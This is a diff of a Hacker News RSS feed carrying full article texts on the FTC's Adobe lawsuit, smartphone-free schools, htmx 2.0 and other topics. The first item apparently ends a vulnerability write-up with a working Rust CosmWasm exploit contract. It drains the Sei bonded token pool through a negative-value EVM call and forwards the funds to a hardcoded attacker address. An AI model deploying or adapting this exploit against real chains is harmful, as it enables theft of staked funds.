+    <span>_info</span><span>:</span> <span>MessageInfo</span><span>,</span>
+    <span>_msg</span><span>:</span> <span>InstantiateMsg</span><span>,</span>
+<span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Response</span><span>,</span> <span>StdError</span><span>&gt;</span> <span>{</span>
+    <span>Ok</span><span>(</span><span>Response</span><span>::</span><span>default</span><span>())</span>
+<span>}</span>
+
+<span>#[cfg_attr(not(feature</span> <span>=</span> <span>"library"</span><span>),</span> <span>entry_point)]</span>
+<span>pub</span> <span>fn</span> <span>execute</span><span>(</span>
+    <span>deps</span><span>:</span> <span>DepsMut</span><span>,</span>
+    <span>_env</span><span>:</span> <span>Env</span><span>,</span>
+    <span>_info</span><span>:</span> <span>MessageInfo</span><span>,</span>
+    <span>msg</span><span>:</span> <span>ExecuteMsg</span><span>,</span>
+<span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Response</span><span>&lt;</span><span>EvmMsg</span><span>&gt;</span><span>,</span> <span>StdError</span><span>&gt;</span> <span>{</span>
+    <span>match</span> <span>msg</span> <span>{</span>
+        <span>ExecuteMsg</span><span>::</span><span>Attack</span><span>{}</span> <span>=&gt;</span> <span>{</span>
+            <span>let</span> <span>uswei_to_swei_multiplier</span><span>:</span> <span>Int256</span> <span>=</span> <span>1000000000000i64</span><span>.into</span><span>();</span>
+
+            <span>let</span> <span>bal_q</span> <span>=</span> <span>BankQuery</span><span>::</span><span>Balance</span> <span>{</span>
+                    <span>// sdk.AccAddress(tmcrypto.AddressHash([]byte("bonded_tokens_pool")) -&gt; sei1fl48vsnmsdzcv85q5d2q4z5ajdha8yu3chcelk</span>
+                    <span>address</span><span>:</span> <span>"sei1fl48vsnmsdzcv85q5d2q4z5ajdha8yu3chcelk"</span><span>.into</span><span>(),</span>
+                    <span>denom</span><span>:</span> <span>"usei"</span><span>.into</span><span>()</span>
+            <span>};</span>
+            <span>let</span> <span>res</span><span>:</span> <span>BalanceResponse</span> <span>=</span> <span>deps</span><span>.querier</span><span>.query</span><span>(</span><span>&amp;</span><span>bal_q</span><span>.into</span><span>())</span><span>?</span><span>;</span>
+            <span>let</span> <span>bonded_account_balance</span> <span>=</span> <span>res</span><span>.amount.amount</span><span>;</span>
+            <span>// common.BytesToAddress(sei1fl48vsnmsdzcv85q5d2q4z5ajdha8yu3chcelk) -&gt; 0x4feA76427B8345861e80A3540a8a9D936FD39391</span>
+            <span>let</span> <span>bonded_token_addr</span> <span>=</span> <span>"0x4feA76427B8345861e80A3540a8a9D936FD39391"</span><span>;</span>
+            <span>let</span> <span>steal_amt_abs</span> <span>=</span> <span>Int256</span><span>::</span><span>from</span><span>(</span><span>bonded_account_balance</span><span>)</span> <span>*</span> <span>uswei_to_swei_multiplier</span><span>;</span>
+            <span>let</span> <span>steal_amt</span> <span>=</span> <span>steal_amt_abs</span> <span>*</span> <span>Int256</span><span>::</span><span>from</span><span>(</span><span>-</span><span>1</span><span>);</span>
+            <span>let</span> <span>steal_msg</span> <span>=</span> <span>EvmMsg</span><span>::</span><span>CallEvm</span> <span>{</span> 
+                <span>to</span><span>:</span> <span>bonded_token_addr</span><span>.into</span><span>(),</span>
+                <span>data</span><span>:</span> <span>""</span><span>.into</span><span>(),</span>
+                <span>value</span><span>:</span> <span>steal_amt</span>
+            <span>};</span>
+
+            <span>let</span> <span>steal_item</span><span>:</span> <span>Item</span><span>&lt;</span><span>Int256</span><span>&gt;</span> <span>=</span> <span>Item</span><span>::</span><span>new</span><span>(</span><span>"steal_amount"</span><span>);</span>
+            <span>steal_item</span><span>.save</span><span>(</span><span>deps</span><span>.storage</span><span>,</span> <span>&amp;</span><span>steal_amt_abs</span><span>)</span><span>?</span><span>;</span>
+
+            <span>let</span> <span>steal_msg</span><span>:</span><span>CosmosMsg</span><span>&lt;</span><span>EvmMsg</span><span>&gt;</span> <span>=</span> <span>CosmosMsg</span><span>::</span><span>Custom</span><span>(</span><span>steal_msg</span><span>);</span>
+            <span>let</span> <span>steal_msg</span> <span>=</span> <span>SubMsg</span><span>::</span><span>reply_always</span><span>(</span><span>steal_msg</span><span>,</span> <span>1337</span><span>);</span>
+
+            <span>let</span> <span>resp</span> <span>=</span> <span>Response</span><span>::</span><span>new</span><span>();</span>
+            <span>let</span> <span>resp</span> <span>=</span> <span>resp</span><span>.add_submessage</span><span>(</span><span>steal_msg</span><span>);</span>
+
+            <span>Ok</span><span>(</span><span>resp</span><span>)</span>
+        <span>}</span>
+    <span>}</span>
+<span>}</span>
+
+<span>#[cfg_attr(not(feature</span> <span>=</span> <span>"library"</span><span>),</span> <span>entry_point)]</span>
+<span>pub</span> <span>fn</span> <span>reply</span><span>(</span><span>deps</span><span>:</span> <span>DepsMut</span><span>,</span> <span>_env</span><span>:</span> <span>Env</span><span>,</span> <span>_msg</span><span>:</span> <span>Reply</span><span>)</span> <span>-&gt;</span> <span>StdResult</span><span>&lt;</span><span>Response</span><span>&lt;</span><span>EvmMsg</span><span>&gt;&gt;</span> <span>{</span>
+    <span>let</span> <span>steal_item</span><span>:</span> <span>Item</span><span>&lt;</span><span>Int256</span><span>&gt;</span> <span>=</span> <span>Item</span><span>::</span><span>new</span><span>(</span><span>"steal_amount"</span><span>);</span>
+    <span>let</span> <span>transfer_amount</span> <span>=</span> <span>steal_item</span><span>.load</span><span>(</span><span>deps</span><span>.storage</span><span>)</span><span>?</span><span>;</span>
+    <span>let</span> <span>attacker_evm_addr</span> <span>=</span> <span>"0xC399a700B09aEeb7d6b9E6374eEA5dd0639Cb52C"</span><span>;</span>
+
+    <span>let</span> <span>fwd_msg</span> <span>=</span> <span>EvmMsg</span><span>::</span><span>CallEvm</span> <span>{</span>
+        <span>to</span><span>:</span> <span>attacker_evm_addr</span><span>.into</span><span>(),</span> 
+        <span>data</span><span>:</span> <span>""</span><span>.into</span><span>(),</span> 
+        <span>value</span><span>:</span> <span>transfer_amount</span><span>,</span>
+    <span>};</span>
+    <span>let</span> <span>fwd_msg</span><span>:</span><span>CosmosMsg</span><span>&lt;</span><span>EvmMsg</span><span>&gt;</span> <span>=</span> <span>CosmosMsg</span><span>::</span><span>Custom</span><span>(</span><span>fwd_msg</span><span>);</span>
+
+    <span>Ok</span><span>(</span><span>Response</span><span>::</span><span>new</span><span>()</span><span>.add_message</span><span>(</span><span>fwd_msg</span><span>))</span>
+<span>}</span>
+
+
+<span>#[cw_serde]</span>
+<span>pub</span> <span>enum</span> <span>ExecuteMsg</span> <span>{</span>
+    <span>Attack</span> <span>{}</span>
+<span>}</span>
+
+<span>// implement custom query</span>
+<span>impl</span> <span>CustomMsg</span> <span>for</span> <span>EvmMsg</span> <span>{}</span>
+
+<span>// this is a helper to be able to return these as CosmosMsg easier</span>
+<span>impl</span> <span>From</span><span>&lt;</span><span>EvmMsg</span><span>&gt;</span> <span>for</span> <span>CosmosMsg</span><span>&lt;</span><span>EvmMsg</span><span>&gt;</span> <span>{</span>
+    <span>fn</span> <span>from</span><span>(</span><span>original</span><span>:</span> <span>EvmMsg</span><span>)</span> <span>-&gt;</span> <span>Self</span> <span>{</span>
+        <span>CosmosMsg</span><span>::</span><span>Custom</span><span>(</span><span>original</span><span>)</span>
+    <span>}</span>
+<span>}</span>
+
+<span>#[derive(Serialize,</span> <span>Deserialize,</span> <span>Clone,</span> <span>Debug,</span> <span>PartialEq,</span> <span>JsonSchema)]</span>
+<span>#[serde(rename_all</span> <span>=</span> <span>"snake_case"</span><span>)]</span>
+<span>pub</span> <span>enum</span> <span>EvmMsg</span> <span>{</span>
+    <span>CallEvm</span> <span>{</span>
+        <span>to</span><span>:</span> <span>String</span><span>,</span>
+        <span>data</span><span>:</span> <span>String</span><span>,</span> <span>// base64 encoded</span>
+        <span>value</span><span>:</span> <span>Int256</span><span>,</span>
+    <span>},</span>
+<span>}</span>
+</code></pre></div>
+
+  </div></div>]]></description>
+        </item>
+        <item>
+            <title><![CDATA[Htmx 2.0.0 has been released (272 pts)]]></title>
             <link>https://htmx.org/posts/2024-06-17-htmx-2-0-0-is-released/</link>
             <guid>40709769</guid>
             <pubDate>Mon, 17 Jun 2024 19:10:24 GMT</pubDate>
@@ -77,7 +497,7 @@ be reverted by setting <code>htmx.methodsThatUseUrlParams</code> to  the value <
 </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Proton is taking its privacy-first apps to a nonprofit foundation model (148 pts)]]></title>
+            <title><![CDATA[Proton is taking its privacy-first apps to a nonprofit foundation model (158 pts)]]></title>
             <link>https://arstechnica.com/gadgets/2024/06/proton-is-taking-its-privacy-first-apps-to-a-nonprofit-foundation-model/</link>
             <guid>40708046</guid>
             <pubDate>Mon, 17 Jun 2024 17:05:05 GMT</pubDate>
@@ -113,7 +533,7 @@ be reverted by setting <code>htmx.methodsThatUseUrlParams</code> to  the value <
                                                 </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[FTC sues Adobe for hiding fees and inhibiting cancellations (916 pts)]]></title>
+            <title><![CDATA[FTC sues Adobe for hiding fees and inhibiting cancellations (1098 pts)]]></title>
             <link>https://www.ftc.gov/news-events/news/press-releases/2024/06/ftc-takes-action-against-adobe-executives-hiding-fees-preventing-consumers-easily-cancelling</link>
             <guid>40707558</guid>
             <pubDate>Mon, 17 Jun 2024 16:29:53 GMT</pubDate>
@@ -121,7 +541,7 @@ be reverted by setting <code>htmx.methodsThatUseUrlParams</code> to  the value <
 <div id="readability-page-1" class="page"><div><p>The Federal Trade Commission is taking action against software maker Adobe and two of its executives, Maninder Sawhney and David Wadhwani, for&nbsp;deceiving consumers by hiding the early termination fee for its most popular subscription plan and making it difficult for consumers to cancel their subscriptions.</p><p>A <a href="https://www.ftc.gov/system/files/ftc_gov/pdf/adobe_complaint.pdf">federal court complaint</a> filed by the Department of Justice upon notification and referral from the FTC charges that Adobe pushed consumers toward the “annual paid monthly” subscription without adequately disclosing that cancelling the plan in the first year could cost hundreds of dollars. Wadhwani is the president of Adobe’s digital media business, and Sawhney is an Adobe vice president.</p><p>“Adobe trapped customers into year-long subscriptions through hidden early termination fees and numerous cancellation hurdles,” said Samuel Levine, Director of the FTC’s Bureau of Consumer Protection. “Americans are tired of companies hiding the ball during subscription signup and then putting up roadblocks when they try to cancel. The FTC will continue working to protect Americans from these illegal business practices.”</p><p>After 2012, Adobe shifted principally to a subscription model, requiring consumers to pay for access to the company’s popular software on a recurring basis. Subscriptions account for most of the company’s revenue.</p><p>According to the complaint, when consumers purchase a subscription through the company’s website, Adobe pushes consumers to its “annual paid monthly” subscription plan, pre-selecting it as a default. Adobe prominently shows the plan’s “monthly” cost during enrollment, but it buries the early termination fee (ETF) and its amount, which is 50 percent of the remaining monthly payments when a consumer cancels in their first year. Adobe’s ETF disclosures are buried on the company’s website in small print or require consumers to hover over small icons to find the disclosures.</p><p>Consumers complain to the FTC and the Better Business Bureau about the ETF, according to the complaint. These consumers report they were not aware of the existence of the ETF or that the “annual paid monthly” plan required their subscription to continue for a year. The complaint notes that Adobe has been aware of consumers’ confusion about the ETF.</p><p>Despite being aware of consumers’ problems with the ETF, the company continues its practice of steering consumers to the annual paid monthly plan while obscuring the ETF, according to the complaint.</p><p>In addition to failing to disclose the ETF to consumers when they subscribe, the complaint also alleges that Adobe uses the ETF to ambush consumers to deter them from cancelling their subscriptions. The complaint also alleges that Adobe’s cancellation processes are designed to make cancellation difficult for consumers. When consumers have attempted to cancel their subscription on the company’s website, they have been forced to navigate numerous pages in order to cancel.</p><p>When consumers reach out to Adobe’s customer service to cancel, they encounter resistance and delay from Adobe representatives. Consumers also experience other obstacles, such as dropped calls and chats, and multiple transfers. Some consumers who thought they had successfully cancelled their subscription reported that the company continued to charge them until discovering the charges on their credit card statements.</p><p>The complaint charges that Adobe’s practices violate the Restore Online Shoppers’ Confidence Act.</p><p>The Commission vote to refer the civil penalty complaint to the DOJ for filing was 3-0. The Department of Justice filed the complaint in the U.S. District Court<strong>&nbsp;</strong>for the Northern District of California.</p><p><strong>NOTE:</strong> The Commission refers a complaint for civil penalties to the DOJ for filing when it has “reason to believe” that the named defendants are violating or are about to violate the law and that a proceeding is in the public interest. The case will be decided by the court.</p><p>The staff attorneys on this matter are Sana Chaudhry and Daniel Wilkes of the FTC’s Bureau of Consumer Protection.</p></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Let Readers Read (112 pts)]]></title>
+            <title><![CDATA[Let Readers Read (128 pts)]]></title>
             <link>https://blog.archive.org/2024/06/17/let-readers-read/</link>
             <guid>40707084</guid>
             <pubDate>Mon, 17 Jun 2024 16:01:43 GMT</pubDate>
@@ -252,7 +672,7 @@ be reverted by setting <code>htmx.methodsThatUseUrlParams</code> to  the value <
 <div id="readability-page-1" class="page"><div><p>The US government is suing Adobe for allegedly hiding expensive fees and making it difficult to cancel a subscription. In the <a href="https://www.ftc.gov/system/files/ftc_gov/pdf/adobe_complaint.pdf">complaint filed on Monday</a>, the Department of Justice claims Adobe “has harmed consumers by enrolling them in its default, most lucrative subscription plan without clearly disclosing important plan terms.”</p><p>The lawsuit alleges Adobe “hides” the terms of its annual, paid monthly plan in the “fine print and behind optional textboxes and hyperlinks.” In doing so, the company fails to properly disclose the early termination fee incurred upon cancellation “that can amount to hundreds of dollars,” the complaint says.</p><p>When customers do attempt to cancel, the DOJ alleges that Adobe requires them to go through an “onerous and complicated” cancellation process that involves navigating through multiple webpages and pop-ups. It then allegedly “ambushes” customers with an early termination fee, which may discourage them from canceling.</p><p>Customers encounter similar obstacles when attempting to cancel their subscriptions over the phone or via live chats, the DOJ alleges. The complaint claims “subscribers have had their calls or chats either dropped or disconnected and have had to re-explain their reason for calling when they re-connect.” The lawsuit alleges that these practices break federal laws designed to protect consumers.</p><p>The lawsuit also targets Adobe executives Maninder Sawhney, the senior vice president of digital go-to-market and sales, as well as David Wadhwani, the president of the company’s digital media business. The complaint says both executives “directed, controlled, had the authority to control, or participated in the acts and practices of Adobe.” Adobe didn’t immediately reply to a request for comment.</p><p>“Adobe trapped customers into year-long subscriptions through hidden early termination fees and numerous cancellation hurdles,” Samuel Levine, director of the FTC’s Bureau of Consumer Protection, <a href="https://www.ftc.gov/news-events/news/press-releases/2024/06/ftc-takes-action-against-adobe-executives-hiding-fees-preventing-consumers-easily-cancelling?utm_campaign=ftc_takes_action_against_&amp;utm_content=1718638330&amp;utm_medium=social&amp;utm_source=twitter">said in a statement</a>. “Americans are tired of companies hiding the ball during subscription signup and then putting up roadblocks when they try to cancel.” The federal government <a href="https://www.theverge.com/2023/12/15/24003532/adobe-says-the-ftc-is-looking-into-its-subscription-cancellation-practices">began looking into Adobe’s cancellation practices</a> late last year.</p><p>In 2012, Adobe went from selling its creative software for lifetime use to charging users for a monthly or yearly subscription to its suite of products, including Photoshop, Illustrator, InDesign, and others. The company’s subscription model has long frustrated creatives, who are often forced to stay subscribed to Adobe in order to keep doing their jobs. Earlier this month, Adobe’s new terms of service were met with <a href="https://www.theverge.com/2024/6/7/24173838/adobe-tos-update-firefly-generative-ai-trust">backlash after some interpreted</a> the move as an opportunity to train its AI on users’ art.</p><div><p>The lawsuit speaks to continued regulatory scrutiny of Adobe. In 2022, <a href="https://www.theverge.com/2022/9/15/23354532/adobe-figma-acquisition-20-billion-official">Adobe attempted to acquire</a> the product design platform Figma for $20 billion, but it <a href="https://www.theverge.com/2023/12/20/24008189/adobe-figma-deal-eu-explained-decoder">abandoned the deal last year after facing antitrust scrutiny</a> from European regulators.</p></div></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Group of 17 London secondary schools join up to go smartphone-free (106 pts)]]></title>
+            <title><![CDATA[Group of 17 London secondary schools join up to go smartphone-free (107 pts)]]></title>
             <link>https://www.theguardian.com/technology/article/2024/jun/06/group-of-17-london-secondary-schools-join-up-to-go-smartphone-free</link>
             <guid>40706288</guid>
             <pubDate>Mon, 17 Jun 2024 15:02:55 GMT</pubDate>
@@ -260,7 +680,7 @@ be reverted by setting <code>htmx.methodsThatUseUrlParams</code> to  the value <
 <div id="readability-page-1" class="page"><div id="maincontent"><p>A group of schools in <a href="https://www.theguardian.com/uk/london" data-link-name="in body link" data-component="auto-linked-tag">London</a> have announced they will go smartphone-free, in a sign of the growing public concern over phone-based childhoods.</p><p>Headteachers at 17 of the 20 state secondary schools in Southwark, south London, have taken the collective action to shift their pupils away from smartphones, in the hope of also addressing the downsides of their use outside the school gates.</p><p>The other three state schools in the borough are working towards introducing the policy.</p><p>The schools will also help families and pupils to understand the well-documented downsides of smartphones and social media use among young people. These include <a href="https://www.theguardian.com/world/2024/apr/30/stop-children-using-smartphones-until-they-are-13-say-french-experts-in-report" data-link-name="in body link">mental health concerns, screen time addiction, the impact on sleep and attention spans</a>, access to inappropriate and graphic content and increased risk of thefts and muggings.</p><p>“We were prompted to collaborate after seeing first-hand the negative impact of smartphones and social media on our children’s wellbeing and education,” said Mike Baxter, headteacher of the City of London academy.</p><p>“While the issues that we had to address typically occurred outside of school hours, it was often in school that these negative behaviours were exposed,” he added.</p><p>The schools have agreed that if any phone is used by a pupil during the school day, it will be confiscated. If the phone is a traditional mobile phone – without access to wifi – it will be returned relatively quickly. If the phone is a smartphone, however, it will not be returned for up to a week – or until parents collect it themselves.</p><p>The measures will impact more than 13,000 young people in one of the highest performing boroughs in London. All secondary schools will impose the policy for children from years 7 to 9. A number of schools in the group, however, are adopting a “whole-school” approach.</p><p>The group of secondary headteachers are also in contact with the leaders of primary headteachers in the borough, in the hope of establishing a borough-wide approach.</p><p>“Creating this positive change for the wellbeing and success of young people in Southwark is at the centre of this collective drive,” said Baxter. “Children are getting smartphones as young as four. We could make a massive difference if every parent in this borough knows what every school says about smartphones.”</p><p>Jessica West, headteacher of Ark Walworth academy, said the schools had to take action after phone companies failed to do so. “Many requests for stronger measures have been made of ‘big tech’ companies but action is woefully slow and that leaves our children at risk,” she said. “We are therefore acting in collaboration to support families and children in making healthy choices – we take our responsibilities to children seriously.”</p><figure id="d7675f42-b643-4ea0-bac3-99983ea56850" data-spacefinder-role="richLink" data-spacefinder-type="model.dotcomrendering.pageElements.RichLinkBlockElement"><gu-island name="RichLinkComponent" priority="feature" deferuntil="idle" props="{&quot;richLinkIndex&quot;:11,&quot;element&quot;:{&quot;_type&quot;:&quot;model.dotcomrendering.pageElements.RichLinkBlockElement&quot;,&quot;prefix&quot;:&quot;Related: &quot;,&quot;text&quot;:&quot;Campaigners ‘thrilled’ as St Albans aims to be smartphone-free for under-14s&quot;,&quot;elementId&quot;:&quot;d7675f42-b643-4ea0-bac3-99983ea56850&quot;,&quot;role&quot;:&quot;richLink&quot;,&quot;url&quot;:&quot;https://www.theguardian.com/technology/article/2024/may/22/st-albans-headteachers-call-for-under-14s-smartphone-ban&quot;},&quot;ajaxUrl&quot;:&quot;https://api.nextgen.guardianapps.co.uk&quot;,&quot;format&quot;:{&quot;display&quot;:0,&quot;theme&quot;:0,&quot;design&quot;:0}}" config="{&quot;renderingTarget&quot;:&quot;Web&quot;,&quot;darkModeAvailable&quot;:false,&quot;updateLogoAdPartnerSwitch&quot;:true,&quot;assetOrigin&quot;:&quot;https://assets.guim.co.uk/&quot;}"></gu-island></figure><p>A recent House of Commons education committee report found that extended screen time had become increasingly normal for young children and teenagers, with a 52% increase in children’s screen time between 2020 and 2022.</p><p>According to the report, nearly 25% of children and young people use their smartphones in a way that is consistent with a behavioural addiction.</p><p>The collaboration was greeted with delight by Daisy Greenwell, co-founder of <a href="http://smartphonefreechildhood.co.uk/" data-link-name="in body link">Smartphone Free Childhood</a> (SFC).</p><p>“This move from the headteachers in south London is fantastically powerful and pioneering – never have secondary schools clubbed together to take collective action on this issue before,” she said. “We know that the younger a child gets their first smartphone, the higher their incidence of mental illness later on, so this has the potential to change the lives of a generation of children in south London.</p><p>“School leaders have the ability to effect change in their schools immediately and to shape social norms in their communities,” she added.</p><p>The concern about smartphones and children has rocketed. There are now SFC groups in the US, UAE, South Africa, Australia, New Zealand, Switzerland and Portugal.</p><p>In the UK, there has been an increase in parents joining together to make “pacts” not to give their children smartphones until 14 years at least. In <a href="https://www.bristolpost.co.uk/news/bristol-news/bristol-parents-unite-campaign-ban-9241084.amp" data-link-name="in body link">Bristol</a>, 80 schools have started SFC groups and more than 1,000 parents taken pacts.</p><p>“We are so excited about how this is snowballing organically amongst schools, headteachers and parents, it was clearly a conversation that was waiting to happen,” said Greenwell.</p></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[TDK claims solid state battery breakthrough (158 pts)]]></title>
+            <title><![CDATA[TDK claims solid state battery breakthrough (168 pts)]]></title>
             <link>https://arstechnica.com/gadgets/2024/06/tdk-claims-insane-energy-density-in-solid-state-battery-breakthrough/</link>
             <guid>40706164</guid>
             <pubDate>Mon, 17 Jun 2024 14:50:32 GMT</pubDate>
@@ -304,7 +724,7 @@ be reverted by setting <code>htmx.methodsThatUseUrlParams</code> to  the value <
                                                 </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[How to test without mocking (145 pts)]]></title>
+            <title><![CDATA[How to test without mocking (151 pts)]]></title>
             <link>https://www.amazingcto.com/mocking-is-an-antipattern-how-to-test-without-mocking/</link>
             <guid>40705464</guid>
             <pubDate>Mon, 17 Jun 2024 13:31:50 GMT</pubDate>
@@ -453,7 +873,7 @@ Yes, most often you end up with a complicated interpreter when separating the la
 <a title="How to become a CTO in a company - a roadmap to chief technology officer" href="https://www.amazingcto.com/roadmap-to-become-cto/">How to become a CTO in a company - a career path</a></p></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Trading cards with e-ink displays (2023) (277 pts)]]></title>
+            <title><![CDATA[Trading cards with e-ink displays (2023) (293 pts)]]></title>
             <link>https://howtoware.co/wyldcard</link>
             <guid>40705222</guid>
             <pubDate>Mon, 17 Jun 2024 13:04:29 GMT</pubDate>
@@ -461,7 +881,7 @@ Yes, most often you end up with a complicated interpreter when separating the la
 &lt;Not HTML&gt;]]></description>
         </item>
         <item>
-            <title><![CDATA[DJI ban passes the House and moves on to the Senate (287 pts)]]></title>
+            <title><![CDATA[DJI ban passes the House and moves on to the Senate (310 pts)]]></title>
             <link>https://dronedj.com/2024/06/14/dji-ban-passes-the-house-and-moves-on-to-the-senate/</link>
             <guid>40705196</guid>
             <pubDate>Mon, 17 Jun 2024 13:00:35 GMT</pubDate>
@@ -514,7 +934,7 @@ Yes, most often you end up with a complicated interpreter when separating the la
 	<p><em>FTC: We use income earning auto affiliate links.</em> <a href="https://dronedj.com/about-dronedj/#affiliate">More.</a></p><div id="after_disclaimer_placement"><p>You’re reading DroneDJ — experts who break news about DJI and the wider drone ecosystem, day after day. Be sure to check out our <a href="https://www.dronedj.com/">homepage</a> for all the latest news, and follow DroneDJ on <a href="http://twitter.com/dronedj">Twitter</a>, <a href="https://www.facebook.com/dronedj">Facebook</a>, and <a href="http://linkedin.com/company/dronedj">LinkedIn</a> to stay in the loop. Don’t know where to start? Check out our exclusive stories, <a href="https://dronedj.com/guides/review/">reviews</a>, how-tos, and subscribe to our <a href="https://www.youtube.com/dronedj">YouTube channel</a>.</p></div>				</div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[The Programmer's Brain (2021) (106 pts)]]></title>
+            <title><![CDATA[The Programmer's Brain (2021) (108 pts)]]></title>
             <link>https://yoan-thirion.gitbook.io/knowledge-base/software-craftsmanship/the-programmers-brain</link>
             <guid>40704812</guid>
             <pubDate>Mon, 17 Jun 2024 12:15:49 GMT</pubDate>
@@ -1012,7 +1432,7 @@ Once you’ve prepared the table, work your way through the code and calculate t
 </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Being laid off and unplanned entrepreneurship (328 pts)]]></title>
+            <title><![CDATA[Being laid off and unplanned entrepreneurship (334 pts)]]></title>
             <link>https://www.deepsouthventures.com/on-being-laid-off-unplanned-entrepreneurship/</link>
             <guid>40704428</guid>
             <pubDate>Mon, 17 Jun 2024 11:14:40 GMT</pubDate>
@@ -1080,7 +1500,7 @@ Once you’ve prepared the table, work your way through the code and calculate t
 		</div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Developer Takes 'Retro' Concept to New Level by Creating Physical Winamp Player (110 pts)]]></title>
+            <title><![CDATA[Developer Takes 'Retro' Concept to New Level by Creating Physical Winamp Player (112 pts)]]></title>
             <link>https://www.xatakaon.com/makers/a-developer-has-just-taken-the-concept-of-retro-to-a-new-level-by-creating-a-physical-winamp-player</link>
             <guid>40703176</guid>
             <pubDate>Mon, 17 Jun 2024 07:40:18 GMT</pubDate>
@@ -1269,7 +1689,7 @@ Once you’ve prepared the table, work your way through the code and calculate t
   </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[How to get stuff repaired when the manufacturer don't wanna: take 'em to court (379 pts)]]></title>
+            <title><![CDATA[How to get stuff repaired when the manufacturer don't wanna: take 'em to court (380 pts)]]></title>
             <link>https://blog.simonrumble.com/how-to-get-your-stuff-repaired-when-the-retailer-and-manufacturer-dont-wanna-take-em-to-court</link>
             <guid>40702782</guid>
             <pubDate>Mon, 17 Jun 2024 06:14:50 GMT</pubDate>
@@ -1284,7 +1704,7 @@ Once you’ve prepared the table, work your way through the code and calculate t
 </p></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Creativity Has Left the Chat: The Price of Debiasing Language Models (155 pts)]]></title>
+            <title><![CDATA[Creativity Has Left the Chat: The Price of Debiasing Language Models (157 pts)]]></title>
             <link>https://arxiv.org/abs/2406.05587</link>
             <guid>40702617</guid>
             <pubDate>Mon, 17 Jun 2024 05:38:39 GMT</pubDate>
@@ -1625,98 +2045,6 @@ npm run build
 <span>cd</span> ..
 cargo run <span>&lt;</span>sqlite_db<span>&gt;</span></pre></div>
 </article></div></div>]]></description>
-        </item>
-        <item>
-            <title><![CDATA[Why Google Takeout is sooo bad (132 pts)]]></title>
-            <link>https://marcin.cylke.com.pl/2024/06/16/why-google-takeout-is-sooo-bad/</link>
-            <guid>40700146</guid>
-            <pubDate>Sun, 16 Jun 2024 21:12:03 GMT</pubDate>
-            <description><![CDATA[<p>URL: <a href="https://marcin.cylke.com.pl/2024/06/16/why-google-takeout-is-sooo-bad/">https://marcin.cylke.com.pl/2024/06/16/why-google-takeout-is-sooo-bad/</a>, See on <a href="https://news.ycombinator.com/item?id=40700146">Hacker News</a></p>
-<div id="readability-page-1" class="page"><div>
-      <p>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-      
-      
-  <picture>
-  <img src="https://marcin.cylke.com.pl/post_images/why-google-takeout-is-sooo-bad-0.png?v=583ac1f00b55e860bec2435a9f014ec7" alt="Image" loading="lazy" height="1024" width="1024">
-</picture>
-
-<em>Author: <a href="https://ideogram.ai/">IdeogramAI</a> Prompt: The image shows a typical Google Takeout interface with a large error message indicating that the service is unavailable. In the background, there are frustrated users trying to download their data with unsuccessful attempts, represented by repeated “Failed” and “Retry” notifications.</em></p>
-<hr>
-<p>My current data setup is centered around Google Cloud as a place where I store my data. That’s also related to how I use the whole vendor ecosystem.</p>
-<p>The main issue I have with keeping the data only in Google Cloud is data safety. I just don’t want either identity theft or accidental block on my account (by Google) to cut me off from all of my previous photos. You might think it’s something close to impossible, but there are numerous examples of that happening to people - eg. look here <a href="https://www.nytimes.com/2022/08/21/technology/google-surveillance-toddler-photo.html">https://www.nytimes.com/2022/08/21/technology/google-surveillance-toddler-photo.html</a> And ok, this might be a reasonable approach from Google, but who knows what else can trigger that kind of blockage.</p>
-<p>So, to be safe against anything similar or just any other data lose, it would be good to have some backup in place.</p>
-<p>An ideal solution right now would be to:</p>
-<ul>
-<li>copy all the photos to some other cloud</li>
-<li>have an offline copy of those files/photos</li>
-</ul>
-<p>Ideally both of those should happen automatically, according to some predefined schedule. Of course be as maintenance-free as possible.</p>
-<p>I have ~200GB of data that I would like backed up on a regular basis. I’d imagine this is not the biggest set of photos a person can have stored there.</p>
-<h2 id="first-attempts">First attempts</h2>
-<p>My first approach was to synchronize all the files and all the photos using some syncing tools. Store them on a local hard drive, for future use. But that was less then satisfying. Mainly due to how long the process would take for my size of data.</p>
-<p>There’s this open-source python tool <a href="https://github.com/gilesknap/gphotos-sync">https://github.com/gilesknap/gphotos-sync</a> - but I’m yet to try that. Although they also note on their project page issues with the backup process. Citing from there:</p>
-<ul>
-<li>Videos are transcoded to lower quality</li>
-<li>Raw or Original photos are converted to ‘High Quality’</li>
-<li>GPS info is removed from photos metadata</li>
-</ul>
-<p>Bad, but I could live with that, if treating this as a backup.</p>
-<p>There’s also a paid tool <a href="https://photovaultone.com/">https://photovaultone.com/</a> - but it’s just another small vendor lock-in. I’d like to avoid getting deeper into other vendor to be protected from Google.</p>
-<h2 id="so-theres-google-takeout">So there’s Google Takeout</h2>
-<p>And yet, there’s this Google-offered option, that’s designed as a way to take all your data out of Google Cloud and potentially go to some other vendor, or host that on your own. Great idea! Of course Google, as other BigTech companies was coherced to implement it mainly due to GDPR restrictions - so that any user can take the data he/she owns and move out to other place.
-Naturally, I thought I’d use this approach to backup my data.
-This seemed even more amazing, as there’s an option to backup directly to other providers - the options are Dropbox, Microsoft OneDrive, Box.</p>
-<p>I thought that using Microsoft OneDrive is a good alternative! Especially in terms of provider diversification. Also, the options of the backup would allow me to create a couple of bigger files - and copying those to my local backup would be much easier then doing so with hundreds of thousands of photos.</p>
-<p>Choosing Microsoft OneDrive as an intermediate solution is just using another vendor. But the goal is to:</p>
-<ul>
-<li>have the data backed up in another cloud</li>
-<li>be able to download the data in bigger chunks</li>
-</ul>
-<p>On the surface, it looks nice. You can create a scheduled backup process - that may happen at specified intervals, or you can do it one-time.
-You can select data you want to export - be it just Photos, or maybe whole Google Drive, and Calendar, Gmail. Everything is there.</p>
-<p>But when it actually needs to happen - that’s where the issues happen.</p>
